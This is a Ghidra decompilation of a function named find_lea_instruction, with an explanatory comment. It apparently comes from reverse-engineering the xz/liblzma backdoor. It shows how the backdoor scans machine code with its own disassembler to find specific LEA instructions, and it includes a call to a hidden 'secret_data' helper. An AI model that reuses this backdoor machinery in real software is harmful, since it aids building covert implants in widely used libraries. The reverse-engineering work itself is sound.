// /home/kali/xzre-ghidra/xzregh/100EB0_find_lea_instruction.c
// Function: find_lea_instruction @ 0x100EB0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_lea_instruction(u8 * code_start, u8 * code_end, u64 displacement)


/*
 * AutoDoc: Looks for LEA instructions that generate a specific displacement.
 * For every byte offset it runs the decoder, insists on opcode `0x10d`, checks that DF2 reports a plain displacement operand, and compares `mem_disp` against the requested `displacement`, treating `-displacement` as equivalent so mirrored scans still match.
 * Once found the helper returns TRUE with the stack-resident decoder context capturing the instruction.
 */

#include "xzre_types.h"

BOOL find_lea_instruction(u8 *code_start,u8 *code_end,u64 displacement)

{
  BOOL BVar1;
  long lVar2;
  dasm_ctx_t *pdVar3;
  byte bVar4;
  dasm_ctx_t lea_ctx;
  
  bVar4 = 0;
  BVar1 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x7c,5,6,FALSE);
  if (BVar1 != FALSE) {
    pdVar3 = &lea_ctx;
    for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
      *(undefined4 *)&pdVar3->instruction = 0;
      pdVar3 = (dasm_ctx_t *)((long)pdVar3 + ((ulong)bVar4 * -2 + 1) * 4);
    }
    for (; code_start < code_end; code_start = code_start + 1) {
      BVar1 = x86_dasm(&lea_ctx,code_start,code_end);
      if ((((BVar1 != FALSE) && (*(u32 *)&lea_ctx.opcode_window[3] == 0x10d)) &&
          ((lea_ctx.prefix.decoded.flags2 & 7) == 1)) &&
         ((lea_ctx.mem_disp == displacement || (lea_ctx.mem_disp == -displacement)))) {
        return TRUE;
      }
    }
  }
  return FALSE;
}

